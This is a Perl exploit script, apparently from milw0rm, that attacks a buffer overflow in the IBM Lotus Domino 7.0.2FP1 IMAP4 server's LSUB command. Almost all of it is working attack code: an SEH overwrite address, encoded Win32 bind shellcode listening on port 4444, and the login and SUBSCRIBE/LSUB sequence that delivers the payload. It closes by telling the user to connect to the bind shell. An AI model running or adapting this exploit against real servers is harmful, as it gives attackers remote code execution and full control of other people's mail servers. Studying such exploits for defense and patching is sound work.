#!perl
#
# "IBM Lotus Domino" IMAP4 Server 'LSUB' Command Exploit
#
# Author:  Manuel Santamarina Suarez
# e-Mail:  FistFuXXer@gmx.de
#

use IO::Socket;
use File::Basename;

#
# destination TCP port
#
$port = 143;

#
# SE handler
#
# You can only use HEX values from 0x20 to 0x7e! (printable ASCII characters)
# You must use a POP/POP/RET sequence that doesn't modify the ESP register or
# the shellcode decoder will fail.
#
$seh = reverse( "\x60\x21\x53\x4E" );  # POP EDI/POP EBP/RET
                                       # nnotes.6021534e
                                       # universal on Lotus Domino 7.0.2FP1


#
# Shellcode
# You can only use HEX values from 0x20 to 0x7e! (printable ASCII characters)
#
# 1. Step: Modified Win32 Bind Shellcode (EXITFUNC=thread, LPORT=4444)
# 2. Step: Encoded with Alpha 2.0 (BASEADDRESS=ESP)
#
$sc = "TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIeyZiMSKYnPYI".
      "JNJy0tGTydqKOqcCDS2wDWLMnzmSxkYlkRYdLksMRFhWoOZNbRe5mxBWuVHvqcFS".
      "7vIORKmLzQmOToWf3RvqWhTOUViUD7Wfqvn3yLusEVmKMiuvBmuSkKNsrmzNpPhV".
      "bgOgpVIEsVRNpl2cOYnRDbl26fJePsR6cVkLKlUKO6TQWx6kLLpqRtGKVftSekP3".
      "OaKKlTgVV6KNyLqDoMtQB75KWvJJ0KoJGvzzSog9M5ftwiwisQkzMxiQXkyYDqqo".
      "ONy8uocPKNMxUX2crRPJWOKlsPavRLQWQbPLs8MNphKLZvXznenx5RamlOQumWQo".
      "btLSI2OJYJe5mQ0DyNyY7tctxNJiR4pDcBpJUaCOmLo6uaPDVdcKyRSOUyOpewzp".
      "ZzPeMQSMmMZkdBkXaMZRl3lzLcBSUPM8skzitBixQMibMbaNfkXSWp9xSkzjUSRc".
      "hX2EMWOt8eQmdn8QJTHMNHIQKhpemWRQYwkNvQSOXnL7yN9bXgiZfnGNQQUClp3M".
      "HIECH5WVPM59KMkYZolwliSeoQwyJzBMH5FQYlMlJEHhLiLdOkQu5rpS2RrltL70".
      "YO8KFfqVm7mKtFcvxXzkoXKwxe6WLNuB3sYYY8kqm73UlhEp0rQZKl1PbQDYOcPs".
      "RRRlfem8aMibLxKi0mij5TKXQKcUk76wlMLZA";

#
# JUMP to 'ESP adjustment' and shellcode
#
$jmp = "\x74\x20".  # JE SHORT
       "\x75\x20";  # JNZ SHORT


#
#
# Don't edit anything after this line
#
#

$sc_limit = 2300;

sub usage {
    print "Usage: " . basename( $0 ) . " [target] [IPv4 address] [username] [password]\n".
          "Example: ". basename( $0 ) . " 1 192.168.1.19 \"Bill Gates/ServerName\" \"P4ssw0rd\"\n".
          "\n".
          "Targets:\n".
          "[1]  Lotus Domino 7.0.2FP1 on Windows Server 2000 SP4\n".
          "[2]  Lotus Domino 7.0.2FP1 on Windows Server 2003 SP2\n";
    exit;
}


# Net::IP::ip_is_ipv4
sub ip_is_ipv4 {
    my $ip = shift;

    unless ($ip =~ m/^[\d\.]+$/) {
        return 0;
    }

    if ($ip =~ m/^\./) {
        return 0;
    }

    if ($ip =~ m/\.$/) {
        return 0;
    }

    if ($ip =~ m/^(\d+)$/ and $1 < 256) {
        return 1
    }

    my $n = ($ip =~ tr/\./\./);

    unless ($n >= 0 and $n < 4) {
        return 0;
    }

    if ($ip =~ m/\.\./) {
        return 0;
    }

    foreach (split /\./, $ip) {
        unless ($_ >= 0 and $_ < 256) {
            return 0;
        }
    }
    
    return 1;
}


print "--------------------------------------------------------\n".
      ' "IBM Lotus Domino" IMAP4 Server \'LSUB\' Command Exploit'."\n".
      "--------------------------------------------------------\n\n";

if( ($#ARGV+1) != 4 ) {
    &usage;
}

$user = $ARGV[2];
$pass = $ARGV[3];

# Windows 2000 SP4
if( $ARGV[0] == 1 ) {
    $popad = "\x41" x 3 .  # INC ECX
             "\x61" x 51;  # POPAD
}
# Windows 2003 SP2
elsif( $ARGV[0] == 2 ) {
    $popad = "\x41" x 2 .  # INC ECX
             "\x61" x 52;  # POPAD
}
else {
    &usage;
}
    
if( ip_is_ipv4( $ARGV[1] ) ) {
    $ip = $ARGV[1];
}
else
{
    &usage;
}

if( length( $sc ) > $sc_limit ) {
    print "[-] Error: Shellcode's size exceeds $sc_limit bytes!\n";
    exit;
}

print "[+] Connecting to $ip:$port...\n";

$sock = IO::Socket::INET->new (
    PeerAddr => $ip,
    PeerPort => $port,
    Proto    => 'tcp',
    Timeout  => 2
) or print "[-] Error: Couldn't establish a connection to $ip:$port!\n" and exit;

print "[+] Connected.\n";

$mailbox = "\x44" x 280 . $jmp . $seh . "\x44" x 26 . $popad . $sc . "\x44" x 3000;
$sock->recv( $recv, 1024 );
$sock->send( "a001 LOGIN \"$user\" \"$pass\"\r\n" );
$sock->recv( $recv, 1024 );

if( $recv ne "a001 OK LOGIN completed\r\n" ) {
    print "[-] Error: Invalid username or password!\n";
    exit;
}

print "[+] Successfully logged in.\n".
      "[+] Trying to overwrite and control the SE handler...\n";

$sock->send( "a002 SUBSCRIBE {" . length( $mailbox ) . "}\r\n" );
$sock->recv( $recv, 1024 );
$sock->send( "$mailbox\r\n" );
$sock->recv( $recv, 1024 );
$sock->send( "a003 LSUB arg1 arg2\r\n" );
sleep( 3 );
close( $sock );

print "[+] Done. Now check for a bind shell on $ip:4444!\n";

# milw0rm.com [2007-10-27]
